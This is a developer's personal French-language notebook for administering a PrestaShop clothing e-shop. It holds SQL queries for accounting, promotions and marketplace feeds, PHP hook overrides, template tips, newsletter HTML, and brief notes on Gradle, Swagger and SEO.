            delete from ps_guest where id_guest < 210000;
            delete from ps_pagenotfound where id_pagenotfound < 70000;
      pour logguer tracer debugger dans les .php
          error_log('LAURENT pagination : $page_nb=$total_prod/$this->n : '.$pages_nb."=".$total_products."/".$this->n);
      si on ne voit pas VOUCHERS bon de reduction
          degreffer le module paypal du header
      generer le sitemap
      generer sitemap-LG-with-image sans prestashop (menu à gauche > sitmaps>Plan du site avec LG langues et produit des images) pour les 3 langues
      telecharger les trois fichiers sous windows et ouvrir chacun d'eux sur pspad
      copier tout sauf balise ouvrante et fermante root et coller dans excell une fois puis une deuxieme  fois en mode transpose
      copier le mode transpose et coller dans pspad à l'endroit ou j'ai copie avant
      aller en bas du doc et remplacer </url> par </url>\n vers le haut pour tous en expression reg
      Remplacer touts les tabs "	  " par rien
      copier les balises sous la root et coller dans nouvelle feuille excell premiere colonne (doit prendre qu'une col)
      deuxième colonne =FIND("-";A1)
      troisième colonne =LEN(A1)
      quatrième colonne =RIGHT(A1;C1-B1)
      ordonner tout par la quatrième colonne
      virer les lignes en doublons à l'aide de la 4e colonne
      copier la première colonne et la coller dans pspad à l'endroit ou j'ai copie precedemment. Sauver et deposer (remplacer) le fichier sur le serveur.
      aller sur google search console et declarer ce nouveau sitemap.
  pour remettre le sapin de noel : 
              chercher "sapin.jpg"
      pour faire la comptabilite: ! ne plus dire à wenhua qu'on a besoin de la tva. il faut que je garde tout meme si il ya pas de tva 
          voir sous F:\Mesdocuments\WenhuaDuverge\web\comptabilite 
                Paypal : Menu rapports https://business.paypal.com/merchantdata/reportHome > Rapport Financier mensuel
                Amazon : Menu Rapports > tous les releves > clique droit et ouvrir dans un nouvel onglet chaque page "afficher le recaptitulatif" > imprimer page > enregistrer format pdf . ne mettre que la somme recue (ne pas oublier de choisir la somme imputée de la commission amazon du coup le cout de transport ne doit pas parraitre dans mon fichier excell)
                Google AdWords cle a molette > configuration > facturation et payement >Toutes transactions > TVA > Documents. (avant : > roue parametres > Facturation > select paiement > TVA > choisir periode  > OK > Facture UE avec TVA > cliquer sur lien facture )
                Facebook : .../Gerer les publicites > menu >bien choisir compte WENHUADUVERGE  > Facturation et moyens de payement > afficher toutes les transactions depuis le debut > Telecharger toutes les factures > Resume de la facture au format PDF > telecharger 
                Gandhi PRECISER PAR ECRIT A WENHUA QUE C EST MOI QUI PAYE AVEC MA CARTE > choisir compte de wenhua sur nouveau site > factures > facile! 
                Mailjet   mon nom>mon compte > sous facturation : vos habonnements et vos factures
                Achats Prestashop (paye avec mon compte banquaire mais au nom de SARL MA WENHUA: https://addons.prestashop.com/fr/historique-des-commandes
                CM-CIC Monetico : Gestion des payements : (MAIS NON! c pas eshop)  
                Shoptiques Rajouter les ventes dans le fichier excell
                Facture Free : faire. > mon abonnement > consulter mes facture
                Envoimoinscher : Mon nom > Factures
          requete de la compta des ventes par internet : 
             select CONCAT('F...',invoice_number), reference,
									ps_order_invoice.total_products - total_discounts_tax_excl,  
									'',									
									ps_order_invoice.total_products_wt - total_discounts_tax_incl,  
									ps_order_invoice.total_shipping_tax_excl,
									'',
									total_shipping,
									ps_order_invoice.total_paid_tax_excl,
									total_paid_real, 
									invoice_date,
									payment,
									ps_state.name
                  from ps_orders
                  inner join ps_order_invoice on ps_orders.id_order = ps_order_invoice.id_order
                  inner join ps_order_payment on ps_order_payment.order_reference = ps_orders.reference
									inner join ps_address on ps_address.id_address = ps_orders.id_address_invoice
									left join ps_state on ps_state.id_state = ps_address.id_state
                  where (payment like 'PayPal' or payment like 'CM-CIC%') -- a mettre a jour si besoin
							 		and current_state != 8 -- payment error
                  order by ps_orders.date_add

                  A mettre dans le fichier sous F:\Mesdocuments\WenhuaDuverge\web\comptabilite
                  remplacer les . par des , : puis si colonne taxeproduit20% si ttc = ht alors mettre les ttc à 0 et si ttc!=ht faire la soustraction pour les 20%taxes
                  
      Attention toujours vider le cache quand modif d'une classe .. enfin souvent le faire quoi sinon abheration: rien ne s'affiche...
      pour faire un avoir suite à un retur : 
            quand dans Commandes>retours je suis passe jusqu'à l'etape retour termine, aller dans Commandes, cheercher ma commande , ouvrir, cliquer sur "retourner produit" cocher generer un avoir, COCHER GENERER UN BON DE REDUCTION, COCHER REMBOURSER LE TRANSPORT choisir le produit pour l'avoir, valider avec "Retrourner les prduits"
        les variables d'affichage ou non des taxes : 
                  $display_tax_label : se defini dans l'admin > Localisation > Pays > chois du pays > dernier bouton en bas de page
							    $priceDisplay : se defini au niveau Clients > Groupes > choix d'un groupe > affichage des prix TTC ou HT
        Sous /shop/classes/pdf j'ai modifie les classes pour que les PDF soient dans la langue du pays de destination point barre.
                PDF.php sert à definir le charset des PDF
                HTMLTemplate sert à definir la langue du PDF.(libelles) 
        les libelles traduisibles se creent quand on ecrit dans une classe : 
                		$this->smarty->assign(array(
                  			'header' => HTMLTemplateInvoice::l('INVOICE'), /// ca au lieu de 
                        //'header' => $this->l('INVOICE'),                               ca
                  		));

        pour modifier les informations des produits
              le faire que dans la base de donnee table ps_product_lang pour le moment parce que prestashop change mon html
              attention, a chaque modif d'un produit dans prestashop il change le html des infos
        pareil pour les cms: table ps_cms_lang
        quand je livre en prod ou sur un autre serveur
            mettre à jour la table ps_configuration avec le bon nom de domaine
            vider le cache memoire de mon browser
        exist bug sur ordre categories: 
            quand je change ordre dans categorie, recharger page chaque fois pour verifier
    la gestion de l'ordre order d'affichage dans la premiere page : (MAIS l'activation du cache empeche le random meme si la requete est random) 
          ps_category_product (num cat = 2) (la requete est dans F:\www\WenhuaDuvergeShop\toutsaufthemesNEW\classes\Category.php)
    si lenteur pour comprendre pourquoi : vi /home/www-data/wenhuaduverge/shop/config/defines.inc.php
        puis activer le profiling : define('_PS_DEBUG_PROFILING_', false); // le mettre à true   ATTENTION pour bien tout voir, desactiver le cache dans admin
    Fonctionnement des hooks: 
        Voici les hooks dispo : 
            displayHeader
            displayTop
            displayLeftColumn
            displayHome
            displayRightColumn
            displayFooter
        avec l'administration, je peux brancher un module sur un ou plusieurs hooks. Les modules par defaut ce branchent que sur certains hooks. Pour forcer le branchement sur d'autres hooks d'un module creer puis aller sous par ex: 
            www.wenhuaduverge.com/shop/override/modules/blockcmsinfo : dedans creer fichier blockcmsinfo.php qui contient : (bien supprimer le cache pour la prise en compte) 
                                                <?php
                                    class BlockcmsinfoOverride extends Blockcmsinfo 
                                    {
                                    	public function install($delete_params = true)
                                    	{
                                    		$this->registerHook('displayHeader'); // je donne la possibilite à mon module de se brancher sur un autre hook. 
                                    		return parent::install();   // j'appelle la methode parente
                                    	}
                                    	public function hookDisplayHeader($params) // ma nouvelle methode qui est appellee chaque fois que mon hook apparait dans la page.
                                    	{
                                    		 $this->context->controller->addCSS($this->_path.'style.css', 'all');
                                                    if (!$this->isCached('blockcmsinfo.tpl', $this->getCacheId()))    // code recup de la classe parente.
                                                    {
                                                            $infos = $this->getInfos($this->context->language->id, $this->context->shop->id);
                                                            $this->context->smarty->assign(array('infos' => $infos, 'nbblocks' => count($infos)));
                                                    }
                                    
                                                    return $this->display(__FILE__, 'blockcmsinfo.tpl', $this->getCacheId());     // je dis à mon template de s'afficher. (template C)
                                    	} 
                                    } 
                                    ?>
            Je peux aussi afficher un module n'importe où sur un autre template B en ecrivant ça dans le template B : pour que template B appelle template C
                      {hook h='displayHome' mod='blockcmsinfo'} (affiche moi le module blockcmsinfo qui est branche sur le hook displayHome normalement.)
                      ou bien 
                      {if isset($HOOK_PRODUCT_FOOTER) && $HOOK_PRODUCT_FOOTER}{$HOOK_PRODUCT_FOOTER}{/if} // incroyable mais vrai ca affiche un hook avec tous ses modules. 
        Pour dans le template recuperer l'identifiant de la langue : 
                {$cookie->id_lang}
         Pour dans un template afficher un autre template:
              {$item_tpl_path = $blog->getTemplatePath('post-list-item.tpl')}
              {include file = $item_tpl_path post = $post col = $col tags_tpl_path = $tags_tpl_path} // unclu le template post-list-item.tpl en y injectant le param post avec pour valeur $post ici et col avec.. etc etc..                    
        Pour dans un controlleur envoyer des variables à un template smarty puis renvoyer ce que genère ce tpl smarty comme html:
              DANS CONTROLLEUR 
                    	 $smarty->assign('days_datas', $days_datas); // setter les variables pour qu'elles soit visibles dans le template
            			     $smarty->assign('id_country', $store['id_country']);
            			     ou
            			     $this->context->smarty->assign(array( // setter les variables pour qu'elles soit visibles dans le template
                              'settings' => $settings,
                              'ab_pagination_settings' => $pagination_settings,
                              'ab_first_page_url' => Tools::getValue('ab_first_page_url'),
                              'posts' => $posts,
                              'blog' => $this->module,
                              ));
                      puis:
                      $ret = array('html' => utf8_encode($this->displayTemplate('post-list.tpl')),);
                      exit(Tools::jsonEncode($ret));
            			    return $this->context->smarty->fetch(_PS_THEME_DIR_.'store_infos.tpl');
            	DANS TEMPLATE : 
            	         {foreach from=$days_datas  item=one_day}
                      	<p>
                      		<strong class="dark">{l s=$one_day.day}: </strong> &nbsp;<span>{$one_day.hours}</span>
                      	</p>
                      	{/foreach}
                Pour creer une variable dans un template smarty :
                		{assign var=monboolean value=false}
                      {if $monboolean}
                            blablabla
                      {/if}
              pour ne pas que smarty interprette mes accolades dans du javascript mettre des espaces autour des accolades sinon erreur smarty " Unexpected ": ", expected one of: "}" "
            pour formater un i18n message
                <span class="posts-num">{l s='%d blablabla' mod='amazzingblog' sprintf=[$cat.posts_num]}</span>
                va ecrire "8 blablabla"                      
     
                      
      transporteurs : envoimoinscher : si je veux mettre payant mettre à partir de somme 0 et apuyer toujours sur suivant. pas "terminer" tout de suite sinon erreur javascript quand save 
              Chronopost (Chrono18)
                      International : 13.330000
                      Europe : 5
                      Europe non UE : 7.5           
    
                                  Tarifs transports : (mettre poid de 0 a 100 kg) 
                                      Chronopost 18:                        Afrique Asie Central America North America Oceania South america : 13.33; Europe : 5; Europe non-UE : 7.5
                                      HappyPost(Pack Suivi Europe) :        Afrique Asie Central America North America Oceania South america : 13.33; Europe : 7.5; Europe non-UE : 7.5
                                      Chronopost (Chrono classic) :         Afrique Asie Central America North America Oceania South america : 13.33; Europe : 7.5; Europe non-UE : 7.5
                                      DHL (Express Worldwide)               Afrique Asie Central America North America Oceania South america : 16; Europe : 7.5; Europe non-UE : 7.5
                                      La Poste (Colissimo Expert France)    Afrique Asie Central America North America Oceania South america : 13.33; Europe : 5; Europe non-UE : 7.5
                                      Mondial Relay (C.pourToi® - Europe) 	Afrique Asie Central America North America Oceania South america : 13.33; Europe : 7.5; Europe non-UE : 7.5
                                      Mondial Relay (C.pourToi®)            Afrique Asie Central America North America Oceania South america : 13.33; Europe : 5; Europe non-UE : 7.5
                                      DHL (asia)                            Asie : 16
                Les modules de message sont :   
                      contentbox et custom cms info block
                Promotion pannier: attention toujours mettre un nombre total >0 dans l'admin      
                message de promotion dans ps_contentbox
                        <div class="message" style="text-align: center;"><em> <span style="color: #bd7c05; font-size: 200%; line-height: 261%; font-weight: 800;">" BE ECOLO, BE CHIC ! "</span><br /> <span style="color: #bd7c05; font-size: 155%; line-height: 150%; font-weight: 800; text-transform: none;">WENHUA DUVERGe vous souhaite une très belle annee 2016 !</span> </em><br /> <em><span style="color: red; font-size: 250%; line-height: 200%; font-weight: 800; text-transform: none;white-space: nowrap;">Soldes</span><span style="color: #bd7c05; font-size: 155%; line-height: 150%; font-weight: 800; text-transform: none;"> jusqu'à </span><span style="color: red; font-size: 255%; line-height: 150%; font-weight: 800; text-transform: none;">-50</span><span style="color: red; font-size: 155%; line-height: 150%; font-weight: 800; text-transform: none;"> %</span><span style="color: #bd7c05; font-size: 155%; line-height: 150%; font-weight: 800; text-transform: none;"> + Livraison gratuite à partir du 6 Janvier !!</span></em></div>
                        <div class="message" style="text-align: center;"><em> <span style="color: #bd7c05; font-size: 200%; line-height: 261%; font-weight: 800;">" BE ECOLO, BE CHIC ! "</span><br /> <span style="color: #bd7c05; font-size: 155%; line-height: 150%; font-weight: 800; text-transform: none;">WENHUA DUVERGe wishes you a Happy New Year !</span> </em><br /> <em><span style="color: red; font-size: 250%; line-height: 200%; font-weight: 800; text-transform: none;white-space: nowrap;">Sales</span><span style="color: #bd7c05; font-size: 155%; line-height: 150%; font-weight: 800; text-transform: none;"> up to </span><span style="color: red; font-size: 255%; line-height: 150%; font-weight: 800; text-transform: none;">-50</span><span style="color: red; font-size: 155%; line-height: 150%; font-weight: 800; text-transform: none;"> %</span><span style="color: #bd7c05; font-size: 155%; line-height: 150%; font-weight: 800; text-transform: none;"> + Free delivery from January 6 !!</span></em></div>
                        <div class="message" style="text-align: center;"><em> <span style="color: #bd7c05; font-size: 200%; line-height: 261%; font-weight: 800;">" 环保e时尚 ! "</span><br /> <span style="color: #bd7c05; font-size: 155%; line-height: 150%; font-weight: 800; text-transform: none;">WENHUA DUVERGe 祝您新年快乐！</span> </em><br /> <em><span style="color: red; font-size: 250%; line-height: 200%; font-weight: 800; text-transform: none;white-space: nowrap;">打折季</span><span style="color: #bd7c05; font-size: 155%; line-height: 150%; font-weight: 800; text-transform: none;"> 折扣至 </span><span style="color: red; font-size: 255%; line-height: 150%; font-weight: 800; text-transform: none;">-50</span><span style="color: red; font-size: 155%; line-height: 150%; font-weight: 800; text-transform: none;"> %</span><span style="color: #bd7c05; font-size: 155%; line-height: 150%; font-weight: 800; text-transform: none;"> + 免费国际配送从1月6号开始！</span></em></div>
                        <div class="message" style="text-align: center;"><em> <span style="color: #11C702; font-size: 200%; line-height: 261%; font-weight: 800;">" BE ECOLO, BE CHIC ! "</span><br /> <span style="color: #fc6c9a; font-size: 155%; line-height: 150%; font-weight: 800; text-transform: none;">Suivez le concept "Slow Fashion" de WENHUA DUVERGe</span></em><br><br><span style="color:#ff0202; font-weight:bold; font-size:200%">SOLDES, Jusqu'à -50% ! <br /> </div>
                        ORIGINAL :
                        <div class="message" style="text-align: center;"><em> <span style="color: #11C702; font-size: 200%; line-height: 261%; font-weight: 800;">" BE ECOLO, BE CHIC ! "</span><br /> <span style="color: #fc6c9a; font-size: 155%; line-height: 150%; font-weight: 800; text-transform: none;">Suivez le concept "Slow Fashion" de WENHUA DUVERGe</span></em></div>
                pour faire une promotion par produit : (possible faire direct sur navicat mais ATTENTION au multipages de navicat) 
                      utiliser fichier sous mes documents/wenhuaduverge/promotionssoldes.xlsx(bof)
                        INSERT INTO `ps_specific_price` (`id_specific_price`, `id_product`,  `id_specific_price_rule`, `id_cart`, `id_shop`, `id_shop_group`, `id_currency`, `id_country`, `id_group`,                                                        `id_customer`, `id_product_attribute`, `price`, 			`from_quantity`, `reduction`, 		`reduction_tax`, `reduction_type`, `from`, 												`to`) VALUES 
																	                           ('1669', 						'98', 						'0', 							'0', 			    '0', 			'0', 						'0', 				    	'0', 		    	'ATTENTION toujours faire 1 2 et 3 pour esclure kaikhoa', 		  	'0', 		    		'0', 		   				'-1.000000',     '1', 					'0.300000',        	'1', 						'percentage', '2018-06-27 00:00:00', '2018-08-08 00:00:00');
                                  (mettre 0000-00-00 00:00:00 si on ne veut pas de limite de temps)
                        update `ps_specific_price` set `reduction`='0.40', `from`='2018-06-27 00:00:00',  `to`='2018-08-08 00:00:00' where `id_product` in (71,1);
                        attention a bien definir la combinaison; product_attribute par defaut correctement dans l'admin si prix varie fonction couleurs
                    Pour recuperer tous les produits qui n'ont pas de promotions encore pour faire les inserts : 
                            select ata.id_product, ata.id_product_attribute from ps_product_attribute ata 
                            left join ps_specific_price sp on sp.id_product=ata.id_product and sp.id_product_attribute = ata.id_product_attribute
                            where sp.`from` is null
                            puis 
                            select max(id_specific_price) from ps_specific_price     
                        partenaires : 
                            ps_cms_lang                                                                          
    
    PRESTASHOP VERS AMAZON                      
        prestashop et amazon pour facilement editer les EAN sur prestashop, utiliser cette requette sql : (voir E:\Mesdocuments\apprendre\developpement\AmazonEnfant, AmazonParent....) 
                                                                          
                                                                          
                                                                PUIS ouvrir F:\Mesdocuments\WenhuaDuverge\web\Amazon\Premier fichier fichier excell setter 3e colonne comme texte, coller valeurs en laissant la 1ere colonne telle quelle, A l'aide de la 1ere colonne inserer lignes vides à chaque nouveau SKU et le nommer "Parent" a l'aide fonction "=CONCATENER(GAUCHE(A5;11);"Parent")" 
                                                                PUIS ouvrir un nouveau F:\Mesdocuments\WenhuaDuverge\web\Amazon\Flat.File.Clothing.fr.xls : toutes les cellules EAN doivent etre converties en "text". COLLER le contenu. Ensuite decaller toutes les colonnes juste apres les images vers le prochain bloc, PUIS convertir les images avec separateur = ',' PUIS exporter en excell avec nom Flat.File.ClothingExport1.fr.xls SINON: (facultatif maintenant) exporter en txt avec tabulation. Ce fichier sera importe.
                          Prestashop vers GOOGLE MERCHANT :
                                               d'abord SET SESSION group_concat_max_len = 1000000; puis
                                                select 
                                                              CONCAT(ps_product.reference,'-',ps_product_attribute.id_product_attribute),
																															CASE WHEN LENGTH(ps_product_lang.name)>69 THEN CONCAT(SUBSTR(LOWER(ps_product_lang.name),1,67),'...') ELSE LOWER(ps_product_lang.name) END,    
																															REPLACE(REPLACE(REPLACE(REPLACE(REPLACE (REPLACE (REPLACE(ps_product_lang.description_short,'<p>',''),'</p>',' '),'<ul>',''),'</ul>',''),'<li>',''),'</li>',''),'\n','') descr,
																															1604 googleCategory,
																															CONCAT('Women\'s Clothing >', LOWER(ps_product_lang_en.name)) wdCategory,
																															CONCAT('https://www.wenhuaduverge.com/shop/fr/',ps_category_lang_fr.link_rewrite,'/',ps_product_lang.id_product,'-',ps_product_lang.link_rewrite,'.html'),
																															CONCAT('https://www.wenhuaduverge.com/shop/',ps_product_attribute_image.id_image,'-home_default/',ps_product_lang.link_rewrite,'.jpg'),
																															GROUP_CONCAT(CONCAT('https://www.wenhuaduverge.com/shop/',ps_product_attribute_image.id_image,'-home_default/',ps_product_lang.link_rewrite,'.jpg')),
																															'new',
																															CASE(ps_stock_available.quantity) WHEN 0 THEN 'out of stock' ELSE 'in stock' END,
																															CONCAT(ROUND(1.2* ps_product.price),' EUR'),
																															CASE WHEN ps_specific_price.reduction is null then '' ELSE (CONCAT(ROUND(1.2* ps_product.price)-ps_specific_price.reduction*ROUND(1.2* ps_product.price),' EUR')) END,
																															'',
																															-- CONCAT(ROUND(1.2* ps_product.price)-(CASE WHEN ps_specific_price.reduction is null then 0 ELSE ps_specific_price.reduction END)*ROUND(1.2* ps_product.price),' EUR'),
																															-- ps_specific_price.reduction,
																															-- ROUND(1.2* ps_product.price),
																															ps_product_attribute.ean13,
																															'WENHUA DUVERGe',
																															'',
																															ps_product.reference,
																															'Female',
																															'Adult',
																															colors.name,
																															size.name,
																															'0 EUR',
																															CONCAT(substr(ps_product_attribute.weight,1,4),'kg')
                                                                                       from ps_product
                                                                                                            inner join ps_product_attribute on ps_product_attribute.id_product=ps_product.id_product
																																																						left join ps_specific_price on ps_specific_price.id_product = ps_product.id_product and (ps_specific_price.id_product_attribute = ps_product_attribute.id_product_attribute or ps_specific_price.id_product_attribute=0) and id_group in(1,2,3)
                                                                                                            inner join ps_product_lang on ps_product_lang.id_product=ps_product.id_product and ps_product_lang.id_lang=1
																																																						inner join ps_product_lang as ps_product_lang_en on ps_product_lang_en.id_product=ps_product.id_product and ps_product_lang_en.id_lang=2
                                                                                                            inner join ps_category_product on ps_category_product.id_product=ps_product.id_product
																																																						inner join ps_category_lang ps_category_lang_fr on ps_category_lang_fr.id_category = ps_category_product.id_category and ps_category_lang_fr.id_lang=1
                                                              																							inner join ps_stock_available on ps_stock_available.id_product = ps_product.id_product and ps_stock_available.id_product_attribute = ps_product_attribute.id_product_attribute
                                                                                                            inner join ps_product_attribute_image on ps_product_attribute_image.id_product_attribute = ps_product_attribute.id_product_attribute
                                                              																							
                                                              																							inner join ps_product_attribute_combination color_combination on color_combination.id_product_attribute = ps_product_attribute.id_product_attribute
                                                              																							inner join ps_attribute colors_attribute on colors_attribute.id_attribute=color_combination.id_attribute and colors_attribute.id_attribute_group=3
                                                              																							inner join ps_attribute_lang colors on colors.id_attribute=color_combination.id_attribute and colors.id_lang =1
                                                              
                                                              																							inner join ps_product_attribute_combination size_combination on size_combination.id_product_attribute = ps_product_attribute.id_product_attribute
                                                              																							inner join ps_attribute size_attribute on size_attribute.id_attribute=size_combination.id_attribute and size_attribute.id_attribute_group=1
                                                              																							inner join ps_attribute_lang size on size.id_attribute=size_combination.id_attribute and size.id_lang =1
                                                              
                                                              
                                                              
                                                                                                            where ps_product_attribute.ean13 not like ''
                                                                                       and ps_category_product.id_category !=2 and ps_category_product.id_category !=3 -- enlever categorie accueil et catalogue
                                                                                                            -- and ps_product.reference like 'AW15YP6'
                                                                                                                          group by ps_product_attribute.id_product_attribute
                                                                                                            order by ps_product.reference, ps_product_attribute.id_product,ps_product_attribute.id_product_attribute



        

pourwenhuanewsletter :
    copie ancien texte ancien mail dans nouveau mail 
    placer images powerpoint sur serveur
    inserer>image decocher case joindre image au mail

                  <div align="center"><a href="http://www.lescuriositesdaurel.com/wenhua-duverge-rencontre-avec-une-styliste-ecolo-chic/">
                        <img alt="WENHUA DUVERGe - La styliste ecolo-chic !! - Les Curiosites d'Aurel" title="WENHUA DUVERGe - La styliste ecolo-chic !! - Les Curiosites d'Aurel" src="http://www.wenhuaduverge.com/shop/img/NewsLetter/BlogCuriositeDAurel3.jpg"  moz-do-not-send="true" width="100%">
                        </a></div>
                        
                        <div align="center"> <big>-15% suppl dès 3 articles achetes ce weekend!<br>
                          <br>
                        </big><a href="http://www.wenhuaduverge.com"><img alt="newsletter-soldes! -15% suppl des 3 articles achetes
                          ce weekend!" title="newsletter-soldes! -15% suppl des 3 articles
                          achetes ce weekend!"
                          src="http://www.wenhuaduverge.com/shop/img/NewsLetter/Solde15.jpg"
                          moz-do-not-send="true"></a></div>
                          
                          
                      <div align="center"> <big><a style="color:black"
                      href="http://www.lescuriositesdaurel.com/wenhua-duverge-rencontre-avec-une-styliste-ecolo-chic/" title="Blog Les Curiosites d'Aurel - Wenhua Duverge la styliste ecolo-chic">Suivez
                            les Curiosites d'Aurel - decouvrez le monde de Wenhua Duverge la
                            styliste ecolo-chic.</a><br>
                          <br>
                        </big><a href="http://www.wenhuaduverge.com"><img alt="Soldes ecochic,
                            Nouvelle demarque !" title="Soldes ecochic, Nouvelle demarque !"
                            src="http://www.wenhuaduverge.com/shop/img/NewsLetter/soldeecochics.jpg"
                            moz-do-not-send="true"></a></div>
                          
                              <div align="center"> <big><a style="color:black"
                              href="http://www.lescuriositesdaurel.com/wenhua-duverge-rencontre-avec-une-styliste-ecolo-chic/"
                                    title="Blog Les Curiosites d'Aurel - Wenhua Duverge la styliste
                                    ecolo-chic">Suivez les Curiosites d'Aurel - decouvrez le monde de
                                    Wenhua Duverge la styliste ecolo-chic.</a><br>
                                  <br>
                                </big> <a href="http://www.wenhuaduverge.com"><img alt="3e demarque !
                                    Jusqu'à -60%. N'attendez plus !" title="3e demarque ! Jusqu'à
                                    -60%. N'attendez plus !"
                              src="http://www.wenhuaduverge.com/shop/img/NewsLetter/soldeecochics3.jpg"
                                    moz-do-not-send="true"></a></div>

                                <div align="center"> <a href="http://www.wenhuaduverge.com/shop/zh"><img
                                src="http://www.wenhuaduverge.com/shop/img/NewsLetter/soldeEshop.jpg"
                                      moz-do-not-send="true"></a></div>


                                      avec Mailjet :
                                              <body>
                                                  <div align="center">
                                                  <big><a align="center" style="color:black;margin: 0 auto;" href="http://www.lescuriositesdaurel.com/wenhua-duverge-rencontre-avec-une-styliste-ecolo-chic/" title="Blog Les Curiosites d'Aurel - Wenhua Duverge la styliste ecolo-chic">Suivez les Curiosites d'Aurel - decouvrez le monde de Wenhua Duverge la styliste ecolo-chic.</a><br>
                                                  <br></big>
                                                  <a href="http://www.lescuriositesdaurel.com/wenhua-duverge-rencontre-avec-une-styliste-ecolo-chic/"><img alt="Nouvel an Chinois !" title="Nouvel an Chinois !" src="http://www.wenhuaduverge.com/shop/img/NewsLetter/solde-nouvel an chinois.jpg" moz-do-not-send="true" style="margin: 0 auto; width: 100%;"></a>
                                                <br>
                                                    <a href="http://www.wenhuaduverge.com/shop/">
                                                  <img src="http://www.wenhuaduverge.com/shop/img/NewsLetter/address.jpg" moz-do-not-send="true" style="margin: 0 auto; width: 100%;"></a>
                                                  </div>
                                                  <p><small><a style="color:black" href="[[UNSUB_LINK_FR]]">cliquez ici pour vous desabonner</a>.</small></p>
                                                </body>

                          
                          S ENVOYER A SOI MEME AVANT, RESPONSABLE


                        clients prestashop en chine:
                                                select iso_code, ps_country.id_country, email from ps_customer 
                                inner join ps_address on ps_customer.id_customer = ps_address.id_customer
                                inner join ps_country on ps_country.id_country = ps_address.id_country 
                                where ps_country.id_country=5 and email not in ('mwh09092001@sina.com','laurent.l.duverge-renexter@renault.com')
                                and email not in (select email from ps_customer 
                               inner join ps_address on ps_customer.id_customer = ps_address.id_customer
                               inner join ps_country on ps_country.id_country = ps_address.id_country 
                               where ps_country.id_country=8)
																group by email order by iso_code, email


                                String sql = "select agency.name, agency.description, agency.phone, placearrive.name, placedeparture.name, departure.timedeparture, transit.timearrived, "+
                                
                                pour faire du ascii art :
                                  patorjk.com/software/taag
Filezilla :
  si j'arrive pas à me connecter ou bien manque repertoires essayer de mettre dans nom d'autre : sftp://10.222.... ou ftp://10.22...
  
  
Gradle : (je peux overrider et definir mes propres conventions over configuration. Est flexible, je peux vaire plusieurs builds differents en une seule fois)
            gradle init cree ca: (est capable de convertir projet maven pom.xml en projet gradle): executer à la racine gradle init ou gradlew.bat init
            projet
            |___src
                   |_main_java
                   |_test_java
            |__ build.gradle // contient des tasks LINKtaskgradleff   
            |__ gradle
            |   |__ wrapper
            |       |__ gradle-wrapper.jar // wrapper jar et sa configuration  
            |       |__ gradle-wrapper.properties  // sa configuration
            |__ gradlew // script du wrapper pour unix  
            |__ gradlew.bat // script du wrapper pour windows  
            |__ settings.gradle     // contient le nom de mon projet
  specifier la version de build :1) ou 2)
      1) task wrapper(type: Wrapper) {
            gradleVersion = '1.4'   // meme si le serveur qui build n'a pas cette version, avec gradle ca marche grace au wrapper
            }
      2)  pour unix gradlew ou windows gradlew.bat <task> buildent avec le wrapper qui recupere auto la version specifiee. Pas besoin d'installer gradle
              monprojet/gradlew.bat -v //pour voir la version
              monprojet/gradlew.bat wrapper --gradle-version 4.10 //pour updater la version du wrapper et aussi de gradle par defaut
              commande gradlew.bat c comme gradle mais gradlew s'appuie sur le wrapper et l'installe s'il est pas là. pas gradle.            
  LINKtaskgradleff
              dans build.gradle  
                        task copy(type: Copy, group: "Custom", description: "Copies sources to the dest directory") {   //pour executer cette task : ./gradlew copy
                          from "src"
                          into "dest"
                      }
                      dependencies {
                          api 'org.apache.commons:commons-math3:3.6.1'  // api : sera exporté pour le runtime; implementation: uniquement utile à la compilation et non exporte ; testImplementation pour les tests
                      }
                      repositories { //                    definir les repositories
                                      mavenCentral() // utiliser repository maven sur reseau
                                      ou
                                      mavenLocal() // utiliser repository maven interne local
                                      ou
                                       flatDir {          // utiliser repository local
                                      dirs 'lib', 'myLib' 
                                      }
                      mainClassName='NomMaClasseMain'                   
  changer le language du projet?
      apply plugin: 'java' ou 'groovy'
  executer gradle: skip test  :
    executer gradle.build et dans intellij >Run>Edit... champ script parameters > mettre <task(facultatif)> -x test (exclude test)


swagger : pour qu'un webservice rest(je pense) exposer ses methodes dans une page html wsdl LINKSWAGGER 
      http://localhost:8081/SpringRestEx/rest/v2/api-docs
      pour que swagger fonctionne j'ai rajoute les dependances dans pom.xml
          <!-- swagger -->
            <dependency>
              <groupId>io.springfox</groupId>
              <artifactId>springfox-swagger2</artifactId>
              <version>2.4.0</version>
            </dependency>
            <dependency>
              <groupId>io.springfox</groupId>
              <artifactId>springfox-swagger-ui</artifactId>
              <version>2.4.0</version>
            </dependency>
       et la classe de configuration spring: SwaggerConfig ci dessous
                    @Configuration
                    @EnableSwagger2
                    public class SwaggerConfig
                    {
                            @Bean
                            public Docket api() {
                                return new Docket(DocumentationType.SWAGGER_2)
                                        .select()
                                        .apis(RequestHandlerSelectors.any())
                                        .paths(PathSelectors.any())
                                        .build();
                            }
                    }

            
       copier le json genere par http://localhost:8081/sma-ws/rest/v2/api-docs
       le transformer en Yaml (trouver un convertisseur en ligne:https://www.json2yaml.com/)
       Demarrer swagger-editor :
          installer npm
          telecharger de github swagger-editor et le dezipper sous D:\RD\Swagger.  
          D:\RD\Swagger\swagger-editor-master>npm install -g live-server // installe live-server globalement sur mon systeme.        
          D:\RD\Swagger>live-server swagger-editor 
          aller sur http://192.168.0.26:8080/#/
          copier le yaml
  
octave :
    ajouter colonne de 1 à x
        X = [ones(m, 1), X]; % Add a column of ones to x
    pour voir, visualiser : 
      plot(X);
      hist(X);
      disp(X); pas sur
      surf(X);

Cobol :
    TOTO(20:) tronque et conserve les premiers 20 caractères
seo : 
    A) le site même (google panda)
    Google est mûr et intelligent on ne peux pas le berner : il sait detecter le vrai contenu interessant / concurrents
     1-ETUDIER LA CONCURENCE Faire une requete precise que je veux et voir les concurents meilleurs pour voir ce qu'ils ont de plus que moi, faire un diagnostque avant tout
       mots cles des concurents : 
       https://www.semrush.com: ecrire l'url d'un concurent
                . lister points positifs de la concurrence
                    - Existance de commentaires
                    - Infos precises...
                    - Existance de liens dans les pages pour renvoyer vers autres chose (genre en savoir + ) du coup il ne revient pas vers google pas de rebond
     2- modifier site: site doit plaire,être pertinent,meilleur que les autres pages, etre interessant. mises à jour regulières
      >navigation doit être facile, >qualite doit être excellente, >bien guider, ya des êtres humains chez google qui parcourent les sites. ILs mesurent:
      l'Expertise,l'Autorite, la Legitimite,La Confiance, la Reputation, en rapport avec L'Argent ou la Vie; Apporter une valeur ajoutee
      Eviter les grands sliders si on y voit pas l'objectif, le but, les produits. Le contenu doit être le plus haut possible. ça passe avant l'estetique
